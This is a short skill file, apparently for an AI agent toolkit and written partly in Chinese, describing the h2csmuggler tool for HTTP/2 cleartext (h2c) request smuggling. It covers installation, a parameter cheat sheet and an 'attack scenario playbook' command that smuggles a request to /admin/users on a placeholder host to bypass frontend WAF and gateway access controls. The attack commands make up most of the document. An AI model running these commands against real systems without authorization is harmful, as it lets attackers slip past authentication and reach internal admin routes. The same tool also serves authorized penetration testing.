---
name: h2csmuggler-http2
description: "h2csmuggler uses h2c request smuggling to bypass frontend ACLs. Signals: web vulnerabilities, injection, concurrent multi-URL scanning."
zh-signals: "h2csmuggler: h2c 走私绕过前端 ACL。信号:web漏洞,注入,并发扫描多 URL。"
---

# h2csmuggler

- 攻击大类:C09 Web利用(HTTP走私)
- 上游仓库:https://github.com/BishopFox/h2csmuggler
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install h2csmuggler
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 h2csmuggler.py -u 'https://t.com' -x` | 检测 h2c smuggling |
| `-u url -t` | 直接测试 /admin 绕过 |
| `--threads 10` | 并发扫描多 URL |

## 攻击场景 Playbook

### h2c 走私绕过前端 ACL

```bash
python3 h2csmuggler.py -u 'https://edge.t.com' -x -t /admin/users
# 升级 h2c 后走私的内部路由可绕过 WAF/网关 ACL
```

## 注意事项

利用 Upgrade: h2c 头让前端代理把明文 HTTP/1.1 直通后端,绕过网关鉴权。BishopFox 出品。
